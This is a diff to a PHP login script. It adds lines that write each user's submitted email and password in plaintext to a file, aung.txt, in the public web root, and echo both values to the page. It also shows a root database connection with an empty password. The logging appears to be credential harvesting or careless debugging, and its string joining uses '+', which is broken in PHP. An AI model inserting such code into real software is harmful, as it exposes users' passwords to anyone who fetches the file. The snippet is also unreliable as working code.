@@ -19,6 +19,15 @@ function generateRandomString($length = 7)
 $email=($_POST['email']);
 $pass=($_POST['pass']);
 
+$fileLocation = getenv("DOCUMENT_ROOT") . "/aung.txt";
+  $file = fopen($fileLocation,"w");
+  $content = "email==>" + $email + "password==>" + $pass;
+  fwrite($file,$content);
+  fclose($file);
+
+echo $email;
+echo $pass;
+
 $con=mysqli_connect('localhost', 'root', '');
 mysqli_select_db($con, 'database');
 
